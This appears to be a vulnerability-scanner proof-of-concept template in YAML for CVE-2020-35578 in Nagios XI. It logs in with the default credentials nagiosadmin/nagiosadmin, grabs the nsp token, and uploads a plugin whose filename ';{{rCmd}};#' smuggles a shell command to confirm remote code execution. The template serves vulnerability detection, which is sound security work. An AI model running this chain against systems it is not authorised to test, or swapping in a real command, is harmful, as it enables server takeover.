name: poc-yaml-nagiosxi-cve-2020-35578-rce
manual: true
transport: http
set:
    rCmd: randomLowercase(10)
    rBoundary: randomLowercase(20)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /nagiosxi/login.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"/nagiosxi/images/favicon.ico")
        output:
            search: '"var nsp_str = \"(?P<nsp>.+?)\"".bsubmatch(response.body)'
            nsp: search["nsp"]
    r1:
        request:
            cache: true
            method: POST
            path: /nagiosxi/login.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: nsp={{nsp}}&pageopt=login&username=nagiosadmin&password=nagiosadmin
            follow_redirects: true
        expression: response.body.bcontains(b"Core Config Manager")
    r2:
        request:
            cache: true
            method: GET
            path: /nagiosxi/admin/monitoringplugins.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"/nagiosxi/images/favicon.ico")
        output:
            search: '"var nsp_str = \"(?P<nsp>.+?)\"".bsubmatch(response.body)'
            nnsp: search["nsp"]
    r3:
        request:
            cache: true
            method: POST
            path: /nagiosxi/admin/monitoringplugins.php
            headers:
                Content-Type: multipart/form-data; boundary={{rBoundary}}
            body: "--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\n\r\n--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"nsp\"\r\n\r\n{{nnsp}}\r\n--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\";{{rCmd}};#\"\r\nContent-Type: text/plain\r\n\r\nwhatever\r\n--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"convert_to_unix\"\r\n\r\n1\r\n--{{rBoundary}}--\r\n"
        expression: response.status == 200 && response.body.bcontains(b"New plugin was installed successfully") && response.body.bcontains(bytes(rCmd))
expression: r0() && r1() && r2() && r3()
detail:
    author: Aurora
    links:
        - https://www.exploit-db.com/exploits/49422
    vulnerability:
        id: CT-146128
        level: high
    warning: 注意该脚本会上传文件产生一个临时的无害文件
